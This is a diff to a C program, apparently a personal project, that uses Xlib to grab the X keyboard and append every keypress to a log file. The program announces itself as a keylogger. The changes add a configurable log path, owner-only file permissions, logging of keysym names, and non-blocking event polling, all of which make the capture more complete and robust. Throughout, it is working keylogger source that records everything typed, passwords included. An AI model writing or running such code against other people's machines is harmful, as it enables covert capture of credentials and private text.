@@ -4,96 +4,111 @@
 #include <X11/Xlib.h>
 #include <X11/keysym.h>
 #include <X11/Xutil.h>
+#include <unistd.h>
+#include <sys/stat.h>
 
 // Global variables
 Display *display = NULL;
 FILE *file = NULL;
 int running = 1;
 
-// Cleanup function to release resources
+
 void cleanup() {
     if (file != NULL) {
         fclose(file);
-        printf("File closed.\n");
+        printf("Log file closed.\n");
     }
     if (display != NULL) {
         XCloseDisplay(display);
-        printf("Display closed.\n");
+        printf("X display closed.\n");
     }
     printf("Program exited cleanly.\n");
 }
 
-// Signal handler for neat termination
+//No idea why this still doesn't workkkk'
 void handle_signal(int signal) {
     printf("\nSignal %d received. Cleaning up and exiting...\n", signal);
-    running = 0;  // Stops the main loop
+    running = 0;  // Stop the main loop
 }
 
-// Function to log a key to the file
+
 void log_key(const char *key) {
     if (file != NULL) {
         if (fprintf(file, "%s\n", key) < 0) {
             perror("Error writing to file");
         }
-        fflush(file);  // make sure data is written immediately
+        fflush(file);
     }
 }
 
-int main() {
+int main(int argc, char *argv[]) {
     Window root;
     XEvent event;
+    char *log_file_path = (argc > 1) ? argv[1] : "keylog.txt";
 
-    // Open the X display
+
     display = XOpenDisplay(NULL);
     if (display == NULL) {
         fprintf(stderr, "Unable to open X display\n");
         return 1;
     }
 
-    // Open the root window
+
     root = DefaultRootWindow(display);
 
-    // Sets the input mask to listen for key press and release events
+
     XSelectInput(display, root, KeyPressMask | KeyReleaseMask);
 
-    // Grabs the keyboard input
+
     if (XGrabKeyboard(display, root, True, GrabModeAsync, GrabModeAsync, CurrentTime) != GrabSuccess) {
         fprintf(stderr, "Failed to grab keyboard\n");
         XCloseDisplay(display);
         return 1;
     }
 
-    // Open the log file
-    file = fopen("keylog.txt", "a");
+
+    file = fopen(log_file_path, "a");
     if (file == NULL) {
-        perror("Error opening file");
+        perror("Error opening log file");
         XCloseDisplay(display);
         return 1;
     }
 
-    printf("Keylogger started. Logging to 'keylog.txt'. Press Ctrl+C to exit.\n");
 
-    // Setup signal handler for neat termination
+    chmod(log_file_path, S_IRUSR | S_IWUSR); // Owner read/write only
+
+    printf("Keylogger started. Logging to '%s'. Press Ctrl+C to exit.\n", log_file_path);
+
+
     signal(SIGINT, handle_signal);
     signal(SIGTERM, handle_signal);
 
-    // Main event loop
+
+    atexit(cleanup);
+
+
     while (running) {
-        XNextEvent(display, &event);
+        if (XPending(display) > 0) {
+            XNextEvent(display, &event);
 
-        if (event.type == KeyPress) {
-            char buffer[128] = {0};
-            KeySym keysym;
-            int len = XLookupString(&event.xkey, buffer, sizeof(buffer), &keysym, NULL);
+            if (event.type == KeyPress) {
+                char buffer[128] = {0};
+                KeySym keysym;
+                int len = XLookupString(&event.xkey, buffer, sizeof(buffer), &keysym, NULL);
 
-            if (len > 0) {
-                printf("Key pressed: %s\n", buffer);  // Debugging line
-                log_key(buffer);
+                if (len > 0) {
+                    log_key(buffer);
+                } else if (keysym != NoSymbol) {
+                    const char *keysym_str = XKeysymToString(keysym);
+                    if (keysym_str != NULL) {
+                        log_key(keysym_str);
+                    }
+                }
             }
+        } else {
+            usleep(5000);
         }
     }
 
-    // Cleanup resources
-    cleanup();
     return 0;
 }
